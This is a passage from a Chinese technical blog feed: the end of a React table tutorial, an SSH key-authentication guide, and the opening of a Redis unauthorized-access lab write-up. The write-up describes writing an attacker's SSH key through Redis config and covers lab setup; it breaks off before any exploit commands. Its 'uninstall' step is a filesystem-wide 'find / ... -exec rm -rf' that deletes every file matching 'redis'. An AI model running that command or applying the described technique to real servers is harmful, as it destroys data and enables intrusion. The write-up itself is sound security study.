class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> antd-mobile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="大战bug-「有些版本的依赖库找不到」"><a href="#大战bug-「有些版本的依赖库找不到」" class="headerlink" title="大战bug-「有些版本的依赖库找不到」"></a>大战bug-「有些版本的依赖库找不到」</h4><p>下载较低版本的：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> view antd-mobile versions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行上面的命令可以查看当前源所支持的版本。</p><p>这里我选择了5.0.0的版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> antd-mobile@5.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装成功。</p></blockquote><p>官网提示：对于 React，我们兼容的版本是 <code>^16.8.0</code> <code>^17.0.0</code> <code>^18.0.0</code>。</p><p>所以要安装制定的react版本来适配。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i react-dom@18.0.0<span class="token function">npm</span> i react@18.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="五、使用"><a href="#五、使用" class="headerlink" title="五、使用"></a>五、使用</h1><p>主要参考官网。</p><h2 id="5-1-表格渲染（使用antd，antd-mobile没有表格组件）"><a href="#5-1-表格渲染（使用antd，antd-mobile没有表格组件）" class="headerlink" title="5.1 表格渲染（使用antd，antd-mobile没有表格组件）"></a>5.1 表格渲染（使用antd，antd-mobile没有表格组件）</h2><h3 id="5-1-1-引入Ant-Design表格组件"><a href="#5-1-1-引入Ant-Design表格组件" class="headerlink" title="5.1.1 引入Ant Design表格组件"></a>5.1.1 引入Ant Design表格组件</h3><p>首先，确保你已经安装了Ant Design Mobile，并在你的React组件中引入了表格组件。例如：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> Table <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'antd'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-1-2-定义表格列"><a href="#5-1-2-定义表格列" class="headerlink" title="5.1.2 定义表格列"></a>5.1.2 定义表格列</h3><p>你需要定义表格的列结构，包括每列的标题和数据索引。例如：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> columns <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>        <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'告警字段名称'</span><span class="token punctuation">,</span>        <span class="token literal-property property">dataIndex</span><span class="token operator">:</span> <span class="token string">'name'</span><span class="token punctuation">,</span>        <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'name'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'告警字段值'</span><span class="token punctuation">,</span>        <span class="token literal-property property">dataIndex</span><span class="token operator">:</span> <span class="token string">'value'</span><span class="token punctuation">,</span>        <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'value'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li><strong>title</strong>：列的标题，显示在表头。例如，“告警字段名称”和“告警字段值”。</li><li><strong>dataIndex</strong>：指定数据对象中对应的字段名。<code>Table</code> 组件会根据这个字段名从 <code>dataSource</code> 中获取数据。例如，<code>dataIndex: 'name'</code> 表示从数据对象中获取 <code>name</code> 字段的值作为该列的内容。</li><li><strong>key</strong>：每一列的唯一标识符。在 React 中，通常需要为列表中的每个元素提供一个唯一的 <code>key</code> 属性，以便 React 能够高效地更新和渲染列表。虽然在这里 <code>key</code> 和 <code>dataIndex</code> 相同，但它们的作用不同。</li></ul></blockquote><h3 id="5-1-3-数据源转换"><a href="#5-1-3-数据源转换" class="headerlink" title="5.1.3 数据源转换"></a>5.1.3 数据源转换</h3><p>为了使 <code>Table</code> 组件能够正确地显示数据，我们需要将原始数据转换为 <code>Table</code> 组件所需的格式。原始数据是一个包含多个对象的数组，每个对象代表一个字段和其值。我们需要将这些对象转换为包含 <code>name</code> 和 <code>value</code> 属性的对象，以便 <code>Table</code> 组件能够根据 <code>dataIndex</code> 获取到正确的数据。</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> dataSource <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> key <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>        <span class="token literal-property property">key</span><span class="token operator">:</span> index<span class="token punctuation">,</span>        <span class="token literal-property property">name</span><span class="token operator">:</span> key<span class="token punctuation">,</span>        <span class="token literal-property property">value</span><span class="token operator">:</span> item<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token string">'无'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li><strong>key</strong>：为每个数据项提供一个唯一的标识符，通常可以使用索引或数据中的某个唯一字段。</li><li><strong>name</strong>：从原始数据对象中获取键名作为字段名称。</li><li><strong>value</strong>：从原始数据对象中获取对应的值。如果值为 <code>null</code> 或 <code>undefined</code>，可以显示为“无”。</li></ul><p>通过这样的定义和数据转换，<code>Table</code> 组件能够正确地渲染出包含“告警字段名称”和“告警字段值”的表格。</p></blockquote><h3 id="5-1-4-渲染"><a href="#5-1-4-渲染" class="headerlink" title="5.1.4 渲染"></a>5.1.4 渲染</h3><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> <span class="token function-variable function">AlertTable</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Table</span></span>        <span class="token attr-name">columns</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>columns<span class="token punctuation">}</span></span>        <span class="token attr-name">dataSource</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>dataSource<span class="token punctuation">}</span></span>        <span class="token attr-name">bordered</span>        <span class="token attr-name">pagination</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token boolean">false</span><span class="token punctuation">}</span></span>    <span class="token punctuation">/&gt;</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> AlertTable<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端开发 </tag>
            
            <tag> react开发 </tag>
            
            <tag> AntDesignMobile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh服务公私钥认证</title>
      <link href="/2025/01/08/xi-tong-yun-wei/ssh-fu-wu-gong-si-yao-ren-zheng/"/>
      <url>/2025/01/08/xi-tong-yun-wei/ssh-fu-wu-gong-si-yao-ren-zheng/</url>
      
        <content type="html"><![CDATA[<p>在使用 SSH（Secure Shell）进行远程登录时，指定使用公钥-私钥对的方式进行认证，可以提高安全性并避免输入密码。以下是配置和使用 SSH 公钥-私钥对的步骤：</p><h1 id="1-生成-SSH-密钥对"><a href="#1-生成-SSH-密钥对" class="headerlink" title="1. 生成 SSH 密钥对"></a>1. 生成 SSH 密钥对</h1><p>如果你还没有 SSH 密钥对，可以使用 <code>ssh-keygen</code> 命令生成：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa <span class="token parameter variable">-b</span> <span class="token number">2048</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会生成一个 2048 位的 RSA 密钥对，包括一个私钥（默认为 <code>~/.ssh/id_rsa</code>）和一个公钥（默认为 <code>~/.ssh/id_rsa.pub</code>）。</p><img src="/2025/01/08/xi-tong-yun-wei/ssh-fu-wu-gong-si-yao-ren-zheng/%E6%88%AA%E5%B1%8F2025-01-08%2015.54.43.png" style="zoom:50%;"><p>我这里已经有了就不生成了。</p><h1 id="2-复制公钥到远程服务器"><a href="#2-复制公钥到远程服务器" class="headerlink" title="2. 复制公钥到远程服务器"></a>2. 复制公钥到远程服务器</h1><p>使用 <code>ssh-copy-id</code> 命令将你的公钥复制到远程服务器的 <code>~/.ssh/authorized_keys</code> 文件中。这个命令会自动创建 <code>.ssh</code> 目录和 <code>authorized_keys</code> 文件（如果它们不存在），并设置适当的权限：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-copy-id <span class="token parameter variable">-i</span> ~/.ssh/id_rsa.pub username@remote_host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里 <code>username</code> 是你的远程服务器用户名，<code>remote_host</code> 是远程服务器的地址。</p><p>如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-copy-id <span class="token parameter variable">-i</span> ~/.ssh/id_rsa.pub root@192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/xi-tong-yun-wei/ssh-fu-wu-gong-si-yao-ren-zheng/%E6%88%AA%E5%B1%8F2025-01-08%2015.58.24.png" style="zoom:60%;"><p>上传成功之后，服务端可以看到<code>.ssh</code>目录。</p><img src="/2025/01/08/xi-tong-yun-wei/ssh-fu-wu-gong-si-yao-ren-zheng/%E6%88%AA%E5%B1%8F2025-01-08%2016.00.41.png" style="zoom:50%;"><p><code>~/.ssh/authorized_keys </code>存储的就是你的公钥。</p><p>配置完成之后，ssh登录不再需要输入密码。</p><img src="/2025/01/08/xi-tong-yun-wei/ssh-fu-wu-gong-si-yao-ren-zheng/%E6%88%AA%E5%B1%8F2025-01-08%2016.03.33.png" style="zoom:70%;"><h1 id="3-手动设置公钥（可选）"><a href="#3-手动设置公钥（可选）" class="headerlink" title="3. 手动设置公钥（可选）"></a>3. 手动设置公钥（可选）</h1><p>如果没有 <code>ssh-copy-id</code> 命令，你可以手动将公钥复制到远程服务器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> ~/.ssh/id_rsa.pub <span class="token operator">|</span> <span class="token function">ssh</span> username@remote_host <span class="token string">'mkdir -p ~/.ssh &amp;&amp; chmod 700 ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys &amp;&amp; chmod 600 ~/.ssh/authorized_keys'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="4-配置-SSH-客户端（可选）"><a href="#4-配置-SSH-客户端（可选）" class="headerlink" title="4. 配置 SSH 客户端（可选）"></a>4. 配置 SSH 客户端（可选）</h1><p>在本地 SSH 客户端的配置文件 <code>~/.ssh/config</code> 中，你可以指定使用特定的私钥文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Host remote_hostHostName remote_hostUser usernameIdentityFile ~/.ssh/id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里 <code>remote_host</code> 是远程服务器的地址，<code>username</code> 是你的远程服务器用户名，<code>IdentityFile</code> 指定了私钥文件的路径。</p><p>如果你默认只有一对公私钥，任何ssh服务的认证都使用这对公私钥，不需要做这个配置，SSH 客户端会自动使用 <code>~/.ssh/id_rsa</code> 作为默认的私钥文件进行认证，只要远程服务器上的 <code>~/.ssh/authorized_keys</code> 文件中包含了对应的公钥。但是这样做可能会有安全风险，一旦丢失、泄漏或者被篡改意味着所有的ssh认证都会出现无法认证或被恶意登录的问题。</p><blockquote><p>ssh的-i参数：</p><p><code>-i</code> 代表 identity file，即身份文件，<code>~/.ssh/id_rsa</code> 是私钥文件的路径。</p><p><code>-i ~/.ssh/id_rsa</code>：这个选项指定了用于认证的私钥文件。</p></blockquote><h1 id="5-登录到远程服务器"><a href="#5-登录到远程服务器" class="headerlink" title="5. 登录到远程服务器"></a>5. 登录到远程服务器</h1><p>现在，当你使用 SSH 登录到远程服务器时，SSH 客户端会自动使用指定的私钥进行认证：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> username@remote_host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果一切配置正确，你将无需输入密码即可登录。</p><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul><li>确保私钥文件的权限设置为只有所有者可以读取（<code>chmod 600 ~/.ssh/id_rsa</code>）。</li><li>确保远程服务器上的 <code>.ssh</code> 目录和 <code>authorized_keys</code> 文件的权限正确（<code>.ssh</code> 目录权限为 <code>700</code>，<code>authorized_keys</code> 文件权限为 <code>600</code>）。</li><li>如果你的 SSH 服务配置了不允许密码登录（<code>PasswordAuthentication no</code>），则必须使用密钥认证或其他认证方法。</li><li>如果你使用的是 SSH 代理（<code>ssh-agent</code>），确保私钥已经添加到代理中，这样 SSH 客户端就可以自动使用它进行认证。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统运维 </tag>
            
            <tag> ssh服务 </tag>
            
            <tag> ssh公私钥认证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis未授权访问漏洞</title>
      <link href="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><h2 id="1-1-漏洞简介"><a href="#1-1-漏洞简介" class="headerlink" title="1.1 漏洞简介"></a>1.1 漏洞简介</h2><p>Redis未授权访问漏洞是指Redis服务在默认配置下，绑定在0.0.0.0:6379端口，且没有设置密码认证（默认为空）和防火墙策略的情况下，导致任意用户可以未授权访问Redis服务以及读取Redis的数据。</p><h2 id="1-2-利用条件"><a href="#1-2-利用条件" class="headerlink" title="1.2 利用条件"></a>1.2 利用条件</h2><ul><li><p>Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</p></li><li><p>没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务。</p></li></ul><h2 id="1-3-漏洞影响版本"><a href="#1-3-漏洞影响版本" class="headerlink" title="1.3 漏洞影响版本"></a>1.3 <strong>漏洞影响版本</strong></h2><p>Redis 2.x，3.x，4.x，5.x</p><h2 id="1-4-漏洞危害"><a href="#1-4-漏洞危害" class="headerlink" title="1.4 漏洞危害"></a>1.4 漏洞危害</h2><ul><li><strong>数据泄露</strong>：攻击者可以访问Redis中的所有数据，包括敏感信息。</li><li><strong>数据篡改</strong>：攻击者可以修改或删除Redis中的数据。黑客可以恶意执行flushall来清空所有数据。</li><li><strong>系统权限获取</strong>：攻击者可以利用Redis的<code>config</code>命令进行写文件操作，例如将SSH公钥写入服务器的<code>/root/.ssh/authorized_keys</code>文件中，从而使用对应私钥通过SSH登录目标服务器。</li><li><strong>执行恶意代码</strong>：攻击者可以通过<code>eval</code>命令执行Lua脚本，或者通过数据备份功能往磁盘写入后门程序。</li></ul><h2 id="1-5-利用方法"><a href="#1-5-利用方法" class="headerlink" title="1.5 利用方法"></a>1.5 利用方法</h2><p>攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，攻击者还可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务器登录目标服务器。</p><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><h2 id="2-1-漏洞环境搭建及漏洞测试（redis-4-0-10-复现失败）"><a href="#2-1-漏洞环境搭建及漏洞测试（redis-4-0-10-复现失败）" class="headerlink" title="2.1 漏洞环境搭建及漏洞测试（redis-4.0.10 复现失败）"></a>2.1 <strong>漏洞环境搭建</strong>及漏洞测试（redis-4.0.10 复现失败）</h2><p>靶机:centos7 192.168.52.4</p><p>攻击机:kali 192.168.52.6</p><h3 id="2-2-1-靶机安装redis服务器（redis-server）"><a href="#2-2-1-靶机安装redis服务器（redis-server）" class="headerlink" title="2.2.1 靶机安装redis服务器（redis-server）"></a>2.2.1 靶机安装redis服务器（redis-server）</h3><h4 id="1）下载redis-4-0-10"><a href="#1）下载redis-4-0-10" class="headerlink" title="1）下载redis-4.0.10"></a>1）下载redis-4.0.10</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://download.redis.io/releases/redis-4.0.10.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2011.44.39.png" style="zoom:50%;"><h4 id="2）安装redis-server"><a href="#2）安装redis-server" class="headerlink" title="2）安装redis-server"></a>2）安装redis-server</h4><p>解压，进入源码目录，然后编译(make、make install)</p><ul><li>解压</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> zxf redis-4.0.10.tar.gz <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令详解：</p><ul><li><strong>z</strong>：这个选项告诉 <code>tar</code> 命令使用 <code>gzip</code> 来解压缩文件。<code>gzip</code> 是一种流行的压缩工具，通常用于压缩单个文件。</li><li><strong>x</strong>：这个选项表示解压缩（extract），即从压缩文件中提取文件。</li><li><strong>f</strong>：这个选项后面跟着的是要操作的文件名。在这个例子中，文件名是 <code>redis-4.0.10.tar.gz</code>。</li></ul></blockquote><ul><li>make编译</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> redis-4.0.10<span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><h3 id="大战bug-「源码安装redis时make报错」"><a href="#大战bug-「源码安装redis时make报错」" class="headerlink" title="大战bug-「源码安装redis时make报错」"></a>大战bug-「源码安装redis时make报错」</h3><p>执行<code>make</code>命令报错：</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.23.36.png" style="zoom:40%;"><p>分析判断是没有安装gcc的原因：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> gcc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装后重新执行<code>make</code></p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.27.18.png" style="zoom:40%;"><p>还是报错。</p><p>添加如下参数，继续执行make</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token assign-left variable">MALLOC</span><span class="token operator">=</span>libc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.30.00.png" style="zoom:40%;"></blockquote><ul><li>make install安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.31.16.png" style="zoom:40%;"><h4 id="3）启动服务-redis-server"><a href="#3）启动服务-redis-server" class="headerlink" title="3）启动服务(redis-server)"></a>3）启动服务(redis-server)</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.32.54.png" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.33.27.png" style="zoom:50%;"><p>查看服务是否启动成功：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> redis或<span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> redis或<span class="token function">netstat</span> <span class="token parameter variable">-pantu</span> <span class="token operator">|</span> <span class="token function">grep</span> redis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li><strong>-e</strong>：表示显示所有进程。</li><li><strong>-f</strong>：表示显示完整的格式，包括用户、PID（进程ID）、父进程ID、启动时间、CPU和内存使用情况等详细信息。</li></ul></blockquote><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.34.04.png" style="zoom:40%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.35.43.png" style="zoom:40%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.36.31.png" style="zoom:40%;"><h3 id="2-2-2-攻击机安装redis客户端（redis-cli）"><a href="#2-2-2-攻击机安装redis客户端（redis-cli）" class="headerlink" title="2.2.2 攻击机安装redis客户端（redis-cli）"></a>2.2.2 攻击机安装redis客户端（redis-cli）</h3><h4 id="1）下载redis-4-0-10-1"><a href="#1）下载redis-4-0-10-1" class="headerlink" title="1）下载redis-4.0.10"></a>1）下载redis-4.0.10</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://download.redis.io/releases/redis-4.0.10.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.38.51.png" style="zoom:40%;"><h4 id="2）安装"><a href="#2）安装" class="headerlink" title="2）安装"></a>2）安装</h4><p>解压，编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> zxf redis-4.0.10.tar.gz<span class="token builtin class-name">cd</span> redis-4.0.10<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.42.22.png" style="zoom:30%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.42.47.png" style="zoom:40%;"><h4 id="3）测试redis客户端是否安装完成"><a href="#3）测试redis客户端是否安装完成" class="headerlink" title="3）测试redis客户端是否安装完成"></a>3）测试redis客户端是否安装完成</h4><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.43.34.png" style="zoom:40%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.43.57.png" style="zoom:50%;"><h3 id="2-2-3-漏洞测试"><a href="#2-2-3-漏洞测试" class="headerlink" title="2.2.3 漏洞测试"></a>2.2.3 漏洞测试</h3><p>测试目标靶机是否存在未授权访问,下图说明靶机不存在未授权访问：</p><p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.51.28.png" alt="截屏2025-01-08 13.51.28"></p><p>redis-4.0.10 复现失败。 ✅</p><p>Redis在3.2.0之后增加了一个保护模式，默认还是无密码，但是限制了只有本地(回环接口)才能访问。</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.56.18.png" style="zoom:30%;"><h3 id="2-2-4-卸载redis"><a href="#2-2-4-卸载redis" class="headerlink" title="2.2.4 卸载redis"></a>2.2.4 卸载redis</h3><p>停止服务，ctrl+c即可。</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2013.54.39.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"*redis*"</span> <span class="token parameter variable">-exec</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-2-漏洞环境搭建及漏洞测试（redis-2-8-17-复现成功）"><a href="#2-2-漏洞环境搭建及漏洞测试（redis-2-8-17-复现成功）" class="headerlink" title="2.2 漏洞环境搭建及漏洞测试（redis-2.8.17 复现成功）"></a>2.2 <strong>漏洞环境搭建</strong>及漏洞测试（redis-2.8.17 复现成功）</h2><h3 id="2-2-1-靶机安装redis-2-8-17"><a href="#2-2-1-靶机安装redis-2-8-17" class="headerlink" title="2.2.1 靶机安装redis-2.8.17"></a>2.2.1 靶机安装redis-2.8.17</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://download.redis.io/releases/redis-2.8.17.tar.gz<span class="token function">tar</span> zxf redis-2.8.17.tar.gz <span class="token builtin class-name">cd</span> redis-2.8.17<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.04.37.png" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.05.43.png" style="zoom:50%;"><p>执行失败。</p><p>需要cd到src目录中执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> src./redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.10.13.png" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.15.32.png" alt="截屏2025-01-08 14.15.32" style="zoom:50%;"><p>访问192.168.5.4访问不了。</p><p>访问127.0.0.1 才可以访问。</p><h3 id="2-2-2-kali安装redis-2-8-17-cli"><a href="#2-2-2-kali安装redis-2-8-17-cli" class="headerlink" title="2.2.2 kali安装redis-2.8.17-cli"></a>2.2.2 kali安装redis-2.8.17-cli</h3><p>可以按照如下过程安装，也可以使用redis</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://download.redis.io/releases/redis-2.8.17.tar.gz<span class="token function">tar</span> zxf redis-2.8.17.tar.gz <span class="token builtin class-name">cd</span> redis-2.8.17<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.30.41.png" alt="截屏2025-01-08 14.30.41" style="zoom:50%;"><p>在kali上安装的时候没有执行卸载动作，安装完成之后版本自动变更了。</p><p>其实用原来的4.0.10版本也可以。</p><img 